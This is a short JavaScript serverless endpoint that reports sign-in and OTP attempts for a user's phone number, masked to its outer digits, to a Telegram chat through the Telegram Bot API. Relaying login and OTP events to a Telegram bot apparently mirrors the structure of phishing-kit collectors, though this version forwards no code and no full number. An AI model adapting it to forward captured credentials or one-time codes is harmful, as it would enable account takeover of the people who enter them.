export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Method not allowed"
    });
  }

  try {
    const { phone, result } = req.body || {};

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return res.status(500).json({
        error: "Telegram not configured"
      });
    }

    const safePhone = phone
      ? String(phone).replace(
          /^(\+?\d{2})\d+(\d{2})$/,
          "$1******$2"
        )
      : "Not provided";

    const message =
      `🔐 Sign In attempt\n\n` +
      `📱 Phone: ${safePhone}\n\n` +
      `🔒 OTP requested\n` +
      `📱 Phone: ${safePhone}\n\n` +
      `🔑 OTP\n` +
      `📱 Phone: ${safePhone}\n\n` +
      `✅ Result: ${result || "OTP entered"}`;

    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );

    if (!response.ok) {
      const errorText = await response.text();

      return res.status(500).json({
        error: "Telegram request failed",
        details: errorText
      });
    }

    return res.status(200).json({
      success: true
    });

  } catch (error) {
    return res.status(500).json({
      error: "Server error"
    });
  }
}
